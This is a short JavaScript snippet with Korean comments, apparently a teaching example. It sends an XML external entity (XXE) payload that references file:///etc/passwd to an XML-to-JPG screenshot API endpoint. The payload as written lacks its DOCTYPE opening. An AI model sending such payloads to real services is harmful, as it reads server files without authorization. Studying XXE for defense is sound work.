import utilAPI from './utilAPI';
/*
 * XML -> JPG 유틸리티 API를 타깃으로 새로운 XML HTTP 요청을 생성한다.
 */
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');

/*
 * 많은 XML 파서에 있는 외부 엔티티 기능을 사용하는 XML 문자열을 
 * 수작업으로 만든다.
 */
const rawXMLString = `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;

xhr.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    // 응답 데이터 확인
  }
}

/*
 * XML -> JPG 유틸리티 API 엔드포인트에 보낸다.
 */
xhr.send(rawXMLString);
